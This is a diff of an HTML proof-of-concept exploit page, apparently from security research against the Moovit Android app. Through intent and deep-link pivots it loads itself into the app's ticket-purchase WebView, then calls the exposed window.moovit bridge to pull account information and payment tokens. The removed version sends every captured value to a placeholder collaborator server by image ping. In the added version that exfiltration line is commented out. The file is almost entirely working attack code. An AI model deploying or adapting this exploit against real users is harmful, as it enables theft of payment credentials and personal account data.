@@ -1,113 +1,74 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Moovit Pivot & Exploit</title>
+    <title>Moovit Target Acquired</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background-color: #121212; color: #00ff00; font-family: monospace; padding: 10px; text-align: center; }
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 20px;
-            margin: 10px 0;
-            background: #d32f2f;
-            color: white;
-            text-decoration: none;
-            font-size: 18px;
-            border-radius: 8px;
-            font-weight: bold;
-            border: 2px solid white;
-        }
-        .btn-blue { background: #1976d2; }
-        #logs { 
-            text-align: left; 
-            background: #000; 
-            border: 1px solid #333; 
-            padding: 10px; 
-            min-height: 100px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            margin-top: 20px;
-        }
-        h2 { border-bottom: 1px solid #555; padding-bottom: 10px; margin-bottom: 20px;}
+        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
+        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; font-size: 18px; cursor: pointer; border: 2px solid #0f0; background: #000; color: #0f0; text-decoration: none; }
+        .btn:hover { background: #0f0; color: #000; }
+        #logs { text-align: left; border: 1px solid #333; padding: 10px; margin-top: 20px; word-wrap: break-word; }
     </style>
 </head>
 <body>
 
-    <h2>MOOVIT EXPLOIT</h2>
-    <div id="status" style="color: orange; font-weight: bold;">CHECKING CONTEXT...</div>
+    <h2>TARGET: PurchaseTicketActivity</h2>
+    <div id="status">ANALYZING CONTEXT...</div>
 
-    <div id="pivot-controls">
-        <p>STEP 1: CLICK TO PIVOT</p>
+    <div id="controls">
+        <p>If logs are empty, click these to Pivot:</p>
         
-        <a class="btn" target="_blank" href="intent:#Intent;component=com.tranzmate/com.moovit.ticketing.purchase.web.PurchaseWebTicketActivity;S.url=https://gelo.gg/pocs/moovit_poc.html;end">
-            1. FORCE INTENT PIVOT
+        <a class="btn" href="intent:#Intent;component=com.tranzmate/com.moovit.ticketing.purchase.PurchaseTicketActivity;S.url=https://gelo.gg/pocs/moovit_poc.html;end">
+            1. LAUNCH PURCHASE ACTIVITY
         </a>
 
-        <a class="btn btn-blue" href="moovit://ticketing/purchase?url=https://gelo.gg/pocs/moovit_poc.html">
-            2. TRY MOOVIT:// LINK
+        <a class="btn" href="moovit://purchase_ticket?url=https://gelo.gg/pocs/moovit_poc.html">
+            2. LAUNCH VIA DEEP LINK
         </a>
     </div>
 
-    <h3>EXFIL LOGS</h3>
-    <div id="logs">Waiting for execution...</div>
+    <div id="logs">LOGS:<br></div>
 
     <script>
-        // ==========================================
-        // CONFIGURATION
-        // ==========================================
-        const EXFIL_SERVER = "https://your-collaborator-url.com"; 
-
+        const EXFIL = "https://your-collaborator-url.com";
+        
         function log(msg) {
             document.getElementById("logs").innerHTML += "[*] " + msg + "<br>";
-            // Image ping for exfil
-            new Image().src = EXFIL_SERVER + "/?log=" + btoa(msg);
+            // new Image().src = EXFIL + "/?log=" + btoa(msg); // Uncomment for remote exfil
         }
 
         // ==========================================
-        // EXPLOIT PAYLOAD
+        // EXPLOIT LOGIC
         // ==========================================
-        function runExploit() {
-            document.getElementById("status").innerText = "!!! VULNERABLE !!!";
-            document.getElementById("status").style.color = "#00ff00";
-            document.getElementById("pivot-controls").style.display = "none"; // Hide buttons to clean UI
+        if (window.moovit) {
+            // WE ARE IN!
+            document.getElementById("status").innerText = "!!! VULNERABLE INTERFACE FOUND !!!";
+            document.getElementById("status").style.color = "red";
+            document.getElementById("controls").style.display = "none";
             
-            log("Interface 'moovit' found.");
+            log("SUCCESS: window.moovit exists!");
 
-            // 1. SETUP LISTENERS
-            window.onPaymentTokenResult = function(token) {
-                log("SUCCESS! TOKEN: " + token);
-                alert("STOLEN TOKEN: " + token);
-            };
+            // 1. SETUP TRAPS
+            window.onPaymentTokenResult = function(t) { log("STOLEN TOKEN: " + t); };
+            window.onRequestErrorResult = function(e) { log("ERROR CALLBACK: " + e); };
+            window.onAccountInfoReceived = function(d) { log("ACCOUNT INFO: " + d); };
 
-            window.onRequestErrorResult = function(error) {
-                log("CALLBACK RECEIVED: " + error);
-                alert("DATA: " + error);
-            };
-
-            // 2. TRIGGER ACTIONS
+            // 2. TRIGGER
             try {
                 log("Requesting Account Info...");
                 window.moovit.requestAccountInfo();
-            } catch(e) { log("Err Account: " + e.message); }
+            } catch(e) { log("Err: " + e.message); }
 
             try {
-                log("Requesting Payment Token...");
-                window.moovit.requestPaymentToken(JSON.stringify({amount:"0", currency:"USD"}));
-            } catch(e) { log("Err Payment: " + e.message); }
-        }
+                // Dummy JSON to trigger validation error (which returns data)
+                log("Triggering Payment Token...");
+                window.moovit.requestPaymentToken('{"amount":1, "currency":"USD"}');
+            } catch(e) { log("Err: " + e.message); }
 
-        // ==========================================
-        // INIT CHECK
-        // ==========================================
-        if (window.moovit) {
-            runExploit();
         } else {
-            document.getElementById("status").innerText = "SAFE CONTEXT (CLICK BUTTONS)";
-            log("Bridge not found. Please click a Pivot button above.");
+            // SAFE ZONE
+            log("Interface not found. Please use the buttons above to Pivot.");
         }
     </script>
-
 </body>
 </html>
